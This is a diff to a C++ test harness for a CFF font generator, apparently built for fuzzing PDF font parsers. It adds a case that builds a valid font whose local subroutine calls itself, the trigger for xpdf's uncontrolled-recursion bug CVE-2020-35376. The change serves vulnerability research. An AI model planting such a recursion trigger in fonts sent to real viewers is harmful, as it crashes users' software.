@@ -12,6 +12,7 @@
 // Success cases only (valid CFF). Weakness injection (self-referential callsubr)
 // comes later, once the valid skeleton is proven correct.
 
+#include <climits>
 #include <cstdint>
 #include <cstdio>
 #include <cstring>
@@ -76,7 +77,25 @@ static bool dictOp(const string& f, size_t pos, size_t len, int wantOp, std::vec
     return false;
 }
 
-struct Parsed { bool ok = false; int nGlyphs = 0, nGsubr = 0, nLocal = 0; string glyph0; };
+struct Parsed { bool ok = false; int nGlyphs = 0, nGsubr = 0, nLocal = 0; string glyph0, localsubr0; };
+
+// Decode the first "<operand> callsubr" in a charstring and return the target
+// LOCAL subr index (operand + bias), or INT_MIN if there is none. Used to prove
+// a self/cyclic callsubr was actually injected. (TN#5177 s.3.2 number encoding.)
+static int firstCallLocalTarget(const string& s, int nLocal) {
+    int bias = nLocal < 1240 ? 107 : nLocal < 33900 ? 1131 : 32768;
+    size_t p = 0; int operand = 0; bool haveOp = false;
+    while (p < s.size()) {
+        int b0 = (uint8_t)s[p];
+        if (b0 >= 32 && b0 <= 246)       { operand = b0 - 139; haveOp = true; p += 1; }
+        else if (b0 >= 247 && b0 <= 250) { operand = (b0 - 247) * 256 + (uint8_t)s[p + 1] + 108; haveOp = true; p += 2; }
+        else if (b0 >= 251 && b0 <= 254) { operand = -(b0 - 251) * 256 - (uint8_t)s[p + 1] - 108; haveOp = true; p += 2; }
+        else if (b0 == 28)               { operand = (int16_t)(((uint8_t)s[p + 1] << 8) | (uint8_t)s[p + 2]); haveOp = true; p += 3; }
+        else if (b0 == 10)               { return haveOp ? operand + bias : INT_MIN; }  // callsubr
+        else                             { haveOp = false; p += 1; }
+    }
+    return INT_MIN;
+}
 
 static Parsed reparse(const string& f) {
     Parsed r;
@@ -102,7 +121,11 @@ static Parsed reparse(const string& f) {
             std::vector<int> sv;
             if (dictOp(f, poff, psize, 19, sv) && !sv.empty()) {
                 Index lsub = getIndex(f, poff + (size_t)sv[0]);
-                if (lsub.ok) r.nLocal = lsub.count;
+                if (lsub.ok) {
+                    r.nLocal = lsub.count;
+                    size_t sp, sl;
+                    if (getIndexVal(f, lsub, 0, sp, sl)) r.localsubr0 = f.substr(sp, sl);
+                }
             }
         }
     }
@@ -175,6 +198,40 @@ static void check(const char* name, const pdf_cff::CffFont& font,
     else fails++;
 }
 
+// Weakness case: a CFF that is a perfectly VALID container but carries a
+// charstring/subr with a self- or cyclic callsubr -> uncontrolled recursion in
+// xpdf's cvtGlyph (CVE-2020-35376 / CWE-674). We assert three things:
+//   (i)   the container still parses (skeleton stays valid),
+//   (ii)  the self-reference is actually injected (subr 0's callsubr targets the
+//         expected local subr index -- `expTarget` == 0 means "itself"),
+//   (iii) FontTools STILL accepts it as a valid font -- demonstrating the bug is
+//         invisible to structural validation and only manifests in an interpreter
+//         that EXECUTES the charstring (which is exactly why valid-rate / static
+//         parsing cannot find it, and why the grammar must synthesize it).
+static void check_weakness(const char* name, const pdf_cff::CffFont& font, int expTarget) {
+    string cff = SerializeCff(font);
+    Parsed p = reparse(cff);
+    fprintf(stderr, "=== %s (%zu bytes) [WEAKNESS: CVE-2020-35376] ===\n", name, cff.size());
+    int ok = 1;
+    if (!p.ok) { fprintf(stderr, "  FAIL: container did not parse\n"); fails++; return; }
+    if (p.nGlyphs < 1 || p.nLocal < 1) {
+        fprintf(stderr, "  FAIL: expected >=1 glyph and >=1 local subr (got %d/%d)\n", p.nGlyphs, p.nLocal);
+        ok = 0;
+    }
+    int tgt = firstCallLocalTarget(p.localsubr0, p.nLocal);
+    if (tgt != expTarget) {
+        fprintf(stderr, "  FAIL: subr0 callsubr targets %d, expected %d\n", tgt, expTarget);
+        ok = 0;
+    } else {
+        fprintf(stderr, "  subr0 -> callsubr subr %d  (self-reference injected: cvtGlyph would recurse forever)\n", tgt);
+    }
+    int ftN = fonttools_nglyphs(cff, g_pyPath);
+    if (ftN >= 0)
+        fprintf(stderr, "  FontTools: accepts as VALID CFF (%d glyphs) -- structural validation cannot see the recursion\n", ftN);
+    if (ok) fprintf(stderr, "  PASS: valid CFF container carrying an uncontrolled-recursion charstring\n");
+    else fails++;
+}
+
 int main() {
     GOOGLE_PROTOBUF_VERIFY_VERSION;
 
@@ -228,6 +285,16 @@ int main() {
         f.add_charstrings()->add_ops()->set_op(pdf_cff::ENDCHAR);
         f.add_charstrings()->add_ops()->set_op(pdf_cff::ENDCHAR);
         check("two-glyphs", f, 2, 0, 0, 0x0e);
+    }
+
+    // 6. WEAKNESS: subr 0 calls subr 0 -> the CVE-2020-35376 trigger.
+    {
+        pdf_cff::CffFont f;
+        auto* c = f.add_charstrings();
+        c->add_ops()->set_call_local(0);          // glyph 0 kicks it off
+        c->add_ops()->set_op(pdf_cff::ENDCHAR);
+        f.add_local_subrs()->add_ops()->set_call_local(0);  // subr 0 -> subr 0 (itself)
+        check_weakness("weakness-self-callsubr", f, /*expTarget=*/0);
     }
 
     if (g_pyPath) unlink(g_pyPath);
